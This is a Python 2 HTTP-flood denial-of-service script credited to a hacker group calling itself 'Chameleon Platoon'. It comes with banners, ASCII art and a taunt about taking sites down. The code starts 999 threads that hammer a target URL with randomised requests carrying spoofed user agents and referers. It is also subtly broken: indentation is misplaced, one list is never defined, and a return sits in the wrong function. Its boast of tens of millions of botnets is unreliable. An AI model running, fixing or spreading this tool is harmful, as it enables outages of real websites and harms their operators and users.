####################################->
#4312644bf54db17180c8a95add9fdc06####-->uauauauauauauau
#9dfb17e500b557a9d985c08da4fd0aaf#####--->We will fuck your site D:
#5afc3c0f68ff47b53b485fcd53e898a9######---->Chameleon :(
#ff46a6b3100d11c29d4233c72f604a10#####--->uauauauauauau
#6e70e3b1bf171ae14505f4f8b0dc4e5a####-->
####################################->
#Allahu Akbar!#


import urllib2
import sys
import threading
import random
import re

#global params                                                                                       
url=''                                                                                              ###############################
host=''                                                                                             #~~~~Created By Low And Chameleon~~~~#
headers_useragents=[]                                                                               #~~~~~~~~~~@FollowMe~~~~~~~~~~#
headers_referers=[]                                                                                 #fb.com/chameleon platoon#
request_counter=0                                                                                   #~~~BY Low Waler~~~#
flag=0                                                                                              #~~~~~ChameLeon Script DDoS#
safe=0                                                                                              ###############################

def inc_counter():
	global request_counter
	request_counter+=45

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1
	
# generates a user agent array
def useragent_list():
	global headers_useragents
headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) BlackHawk/1.0.195.0 Chrome/127.0.0.1 Safari/62439616.534')
headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
headers_useragents.append('Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)')
headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0 IceDragon/26.0.0.2')
headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
headers_useragents.append('CSSCheck/1.2.2')
headers_useragents.append('Cynthia 1.0')
headers_useragents.append('HTMLParser/1.6')
headers_useragents.append('P3P Validator')
headers_useragents.append('W3C_Validator/1.654')
headers_useragents.append('W3C_Validator/1.606')
headers_useragents.append('W3C_Validator/1.591')
headers_useragents.append('W3C_Validator/1.575')
headers_useragents.append('W3C_Validator/1.555')
headers_useragents.append('W3C_Validator/1.432.2.5')
headers_useragents.append('W3C_Validator/1.432.2.22')
headers_useragents.append('W3C_Validator/1.432.2.19')
headers_useragents.append('W3C_Validator/1.432.2.10')
headers_useragents.append('W3C_Validator/1.305.2.12 libwww-perl/5.64')
headers_useragents.append('WDG_Validator/1.6.2')
headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.80; Windows NT 6.1; WOW64;')
headers_useragents.append('FunWebProducts; GTB6; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; .NET CLR 1.1.4322)')
headers_useragents.append('Mozilla/5.0 (Linux; U; Android 4.0.3; fr-fr; MIDC41)Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30')
headers_useragents.append('Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91)') 
headers_useragents.append('App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1')
headers_useragents.append('Mozilla/5.0 (Linux; U; Android 4.0.3; ru-ru; Explay Surfer 7.02 Build/ICS.g12refM703A1HZ1.20121009) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0')
headers_useragents.append(' Mozilla/5.0 (Linux; Android 4.2.1; Nexus 7 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko)')
headers_useragents.append('Chrome/18.0.1025.166 Safari/535.19')
headers_useragents.append('Mozilla/5.0 (Android; Mobile; rv:18.0) Gecko/18.0 Firefox/18.0')
headers_useragents.append(' Mozilla/5.0 (Linux; Android 4.2.1; Nexus 4 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko)')
headers_useragents.append('Chrome/18.0.1025.166 Mobile Safari/535.19')
headers_useragents.append('Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D)AppleWebKit/535.19 (KHTML, like Gecko)')
headers_useragents.append('Chrome/18.0.1025.166 Safari/535.19')
headers_useragents.append('Mozilla/5.0 (Linux; Android 4.1.2; GT-I9300 Build/JZO54K)AppleWebKit/535.19 (KHTML, like Gecko)')
headers_useragents.append('Chrome/18.0.1025.166 Mobile Safari/535.19')
headers_useragents.append('Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D)AppleWebKit/535.19 (KHTML, like Gecko)')
headers_useragents.append('Chrome/18.0.1025.166 Safari/535.19')
headers_useragents.append('Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F)AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30')
headers_useragents.append('Mozilla/5.0 (Android; Tablet; rv:18.0) Gecko/18.0 Firefox/18.0')
headers_useragents.append('Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; Nexus S Build/JRO03E)AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30')
headers_useragents.append('Mozilla/5.0 (Linux; Android 4.2.1; Nexus 10 Build/JOP40D)AppleWebKit/535.19 (KHTML, like Gecko)')
headers_useragents.append('Chrome/18.0.1025.166 Safari/535.19')
headers_useragents.append('Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-I9300 Build/JZO54K)AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30')
headers_useragents.append('Mozilla/5.0 (Linux; Android 4.2.1; Galaxy Nexus Build/JOP40D)AppleWebKit/535.19 (KHTML, like Gecko)') 
headers_useragents.append('Chrome/18.0.1025.166 Mobile Safari/535.19')
headers_useragents.append('Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-N5100 Build/JZO54K)')
headers_useragents.append('Agent-SharewarePlazaFileCheckBot/2.0+(+http://www.SharewarePlaza.com)')
headers_useragents.append('Arachnoidea (arachnoidea@euroseek.com)')
headers_useragents.append('Apple-PubSub/65.1.1')
headers_useragents.append('ArachBot')
headers_useragents.append('Apple-PubSub/65.1.1')
headers_useragents.append('ArabyBot (compatible; Mozilla/5.0; GoogleBot; FAST Crawler 6.4; http://www.araby.com;)')
headers_useragents.append('ArachBot')
headers_useragents.append('Arachnoidea (arachnoidea@euroseek.com)')
headers_useragents.append('aranhabot')
headers_useragents.append('ArchitextSpider')
headers_useragents.append('archive.org_bot')
headers_useragents.append('Argus/1.1 (Nutch; http://www.simpy.com/bot.html; feedback at simpy dot com)')
headers_useragents.append('Arikus_Spider')
headers_useragents.append('Arquivo-web-crawler (compatible; heritrix/1.12.1 +http://arquivo-web.fccn.pt)')
headers_useragents.append('ASAHA Search Engine Turkey V.001 (http://www.asaha.com/)')
headers_useragents.append('Asahina-Antenna/1.x')
headers_useragents.append('Asahina-Antenna/1.x (libhina.pl/x.x ; libtime.pl/x.x)')
headers_useragents.append('ask.24x.info')
headers_useragents.append('AskAboutOil/0.06-rcp (Nutch; http://www.nutch.org/docs/en/bot.html; nutch-agent@askaboutoil.com)')
headers_useragents.append('asked/Nutch-0.8 (web crawler; http://asked.jp; epicurus at gmail dot com)')
headers_useragents.append('ASPSeek/1.2.5')
headers_useragents.append('ASPseek/1.2.9d')
headers_useragents.append('ASPSeek/1.2.x')
headers_useragents.append('ASPSeek/1.2.xa')
headers_useragents.append('ASPseek/1.2.xx')
headers_useragents.append('ASPSeek/1.2.xxpre')
headers_useragents.append('ASSORT/0.10')
headers_useragents.append('asterias/2.0')
headers_useragents.append('AtlocalBot/1.1 +(http://www.atlocal.com/local-web-site-owner.html)')
headers_useragents.append('Atomic_Email_Hunter/4.0')
headers_useragents.append('Atomz/1.0')
headers_useragents.append('atSpider/1.0')
headers_useragents.append('Attentio/Nutch-0.9-dev (Attentios beta blog crawler; www.attentio.com; info@attentio.com)')
headers_useragents.append('AU-MIC/2.0 MMP/2.0')
headers_useragents.append('AUDIOVOX-SMT5600')
headers_useragents.append('augurfind')
headers_useragents.append('autoemailspider')
headers_useragents.append('autohttp')
headers_useragents.append('autowebdir 1.1 (www.autowebdir.com)')
headers_useragents.append('AV Fetch 1.0')
headers_useragents.append('Avant Browser (http://www.avantbrowser.com)')
headers_useragents.append('AVSearch-1.0(peter.turney@nrc.ca)')
headers_useragents.append('axadine/ (Axadine Crawler; http://www.axada.de/; )')
headers_useragents.append('AxmoRobot - Crawling your site for better indexing on www.axmo.com search engine.')
headers_useragents.append('Azureus 2.x.x.x')


	
	
	


# generates a referer array
def referer_list():
	global headers_referers
	headers_referers.append('http://www.google.com/?q=')                              ############################
	headers_referers.append('http://www.usatoday.com/search/results?q=')                       #Pre-configured            #
	headers_referers.append('http://engadget.search.aol.com/search?q=')                        #Botnets                   #
	headers_referers.append('http://www.google.com/?q=')                                       #Infected's Websites       #
	headers_referers.append('http://www.usatoday.com/search/results?q=')                       #Best's Shells Only        #
	headers_referers.append('http://engadget.search.aol.com/search?q=')                        #All uploaded by Hax Stroke#
	headers_referers.append('http://www.bing.com/search?q=')                                   #From AnonGhost Team       #
	headers_referers.append('http://search.yahoo.com/search?p=')                               ############################
	headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('http://search.lycos.com/web/?q=')
	headers_referers.append('http://busca.uol.com.br/web/?q=')
	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
	headers_referers.append('http://www.dmoz.org/search/search?q=')
	headers_referers.append('http://www.baidu.com.br/s?usm=1&rn=100&wd=')
	headers_referers.append('http://yandex.ru/yandsearch?text=')
	headers_referers.append('http://www.zhongsou.com/third?w=')
	headers_referers.append('http://hksearch.timway.com/search.php?query=')
	headers_referers.append('http://find.ezilon.com/search.php?q=')
	headers_referers.append('http://www.sogou.com/web?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')

# generates a Keyword list	
def keyword_list():
        global keyword_top
        keyword_top.append('HaxStroke')
        keyword_top.append('Suicide')
        keyword_top.append('Sex')
        keyword_top.append('Robin Williams')
        keyword_top.append('World Cup')
        keyword_top.append('Ca Si Le Roi')
        keyword_top.append('Ebola')
        keyword_top.append('Malaysia Airlines Flight 370')
        keyword_top.append('ALS Ice Bucket Challenge')
        keyword_top.append('Flappy Bird')
        keyword_top.append('Conchita Wurst')
        keyword_top.append('ISIS')
        keyword_top.append('Frozen')
        keyword_top.append('014 Sochi Winter Olympics')
        keyword_top.append('IPhone')
        keyword_top.append('Samsung Galaxy S5')
        keyword_top.append('Nexus 6')
        keyword_top.append('Moto G')
        keyword_top.append('Samsung Note 4')
        keyword_top.append('LG G3')
        keyword_top.append('Xbox One')
        keyword_top.append('Apple Watch')
        keyword_top.append('Nokia X')
        keyword_top.append('Ipad Air')
        keyword_top.append('Facebook')
        keyword_top.append('Anonymous')
        keyword_top.append('DJ Bach')

	headers_referers.append('http://' + host + '/')
	return(headers_referers)
	
#builds random ascii string
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 160)
		out_str += chr(a)
	return(out_str)

def usage():
	print 'SadAttack Version 2.0 DDoS Tool Created By Captain Slicker '
	print 'Chameleon Platoon: https://www.facebook.com/ChameleonPlatoon/'
	print 'New loaded Botnets: 39,445,657'
	print 'Usage: chameleon.py URL Website'
	print 'Example: chameleon.py http:www.example.com/'
	print "\a"
print \
"""
                                                                               
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                        7:              :r                      
                        JvZ.i,:i7i,iL7rr:Pvu                     
                      .:v 2:...irr77L7i:i2 J:.                   
                    ij2E0MML ,.:7;rri:i u8MP8Uj                  
                    :Li.:i0Y   ,i;iii:  j8ii:7j.                 
                     j :7rY: ..,r;rr;i: iFYFv i                  
                     OZ@B@Ei  .;7rir;: :70B@@MM                  
                    .7vuq7 ir  JLri:v,.JL.2qqPP                  
                     7,  i ,: ,i,i::i :5 ,u. vM                  
                     2              .     .  .B                  
                     L:  .  .  ,. ., .v  L: .Mu                  
                     5ri:ir  . .. :,.i. r2i:uZL                  
                     ,:71uvi.:.:i .ir,.:7uFkvi                   
                   :5  r;ivjSNu:u  Lr58X2L7vv  ,                 
                .7M@i  ,iv7NBOkX7: jPMM@kvri   1v.               
            :YPE@@@B7    5@M@SFNFirSN2GB@Bi   :r28Si.            
          rOBBN0B@@@P      71qqMGq8@GqB@u     L7k@M5S5i          
         B@OqFPB@B@NM;  ,L::,.r20qqqFr       r1M@BOYu2qZ8S:      
        i@OX5S2Fqkj5MN  B@B@MXr:,:,  r7uu2. :27kMM8kYuUXB@G      
        uBZSXFS2UYYJ5j J@@@M@B@B@B@B@B@B@BO YLv721PJuu25OP8:     
        E@GPkXFSU1uUUj UBBM@B@B@Ur.BB@B@B@P7LLLk0FYuU52q81Si     
        @BO0PFSFS1F11F:r@B@@@8v     1B@B@ZvUvLU55YuU52FEZJP:     
       .B@880qPNkk5S5SJ .,.            :7rSYL5S5LJJ115EMXuku     
       i@@MEO0EXXS1USFNr                 P1L5X1U0FXSFk@BZqNO     
       S@@ONOO0ENNk2uXPE7      ;G. .    ZqjXqOB@B@B@qZB8OBMBr    
       B@BMXOM8ZO8NX51PPN:  .  ,7.  .  k@UEZ@B@BMMONNZOqGOBMG    
       @B@ONGBOM8OZ0PSuPq5  ..   .... :@EN8MM8S1FENZq8NNEGO8B,   
      iB@B8qEBBMMOM8GN1uXE7 . ..,.,.. 2@OGGZP25X8OOGOM808ZMOML   
      N@BMZEPBBBMMOMMM05uXX.   . . .  0@ME2NXS5ZOMOMM@OGGO8MMk     

 -----------------------------------------------------
/CHAMELEON PLATOON / WIAS PLATOON / CAPTAIN SLICKER  /
-----------------------------------------------------
"""

	
#http request
def httpcall(url):
	useragent_list()
	referer_list()
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(50,100)))
	request.add_header('Keep-Alive', random.randint(110,160))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
 			print '                                                                    '
 			print '#-~-~>CH4M3L30N HYP3R ATTACK<~-~-#'
 			print '#HYPPER HIT FLOODED DATABASE WEBSITE DOWN#'
 			print '#EXPLOSION HTTP BY CHAMELEON DDOS#'
 			print '#~~~>Hitt Full website down BY  ChameLeon<~~~#'
 			print '                                                                    '
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

	
#http caller thread 
class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=httpcall(url)
				if (code==500) & (safe==1):
					set_flag(2)
		except Exception, ex:
			pass

# monitors http threads and counts requests
class MonitorThread(threading.Thread):
	def run(self):
		previous=request_counter
		while flag==0:
			if (previous+999<request_counter) & (previous<>request_counter):
				print "#~~~>ChameLeon DDoS Attack's Sended: %d Sending more<~~~#" % (request_counter)
				previous=request_counter
		if flag==2:
			print "\n ~>Stopping the mass DDoS Attack<~"

#execute 
if len(sys.argv) < 2:
	usage()
	sys.exit()
else:
	if sys.argv[1]=="help":
		usage()
		sys.exit()
	else:
		print "Starting DDoS Leon"
		print "Created By Low walker and chameleon"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
		if url.count("/")==2:
			url = url + "/"
		m = re.search('http\://([^/]*)/?.*', url)
		host = m.group(1)
		for i in range(999):
			t = HTTPThread()
			t.start()
		t = MonitorThread()
		t.start()

####################################->
#4312644bf54db17180c8a95add9fdc06####-->uauauauauauauau
#9dfb17e500b557a9d985c08da4fd0aaf#####--->We will fuck your site D:
#5afc3c0f68ff47b53b485fcd53e898a9######---->ChameLeon Attacker By LowWalker :(
#ff46a6b3100d11c29d4233c72f604a10#####--->uauauauauauau
#6e70e3b1bf171ae14505f4f8b0dc4e5a####-->
####################################->
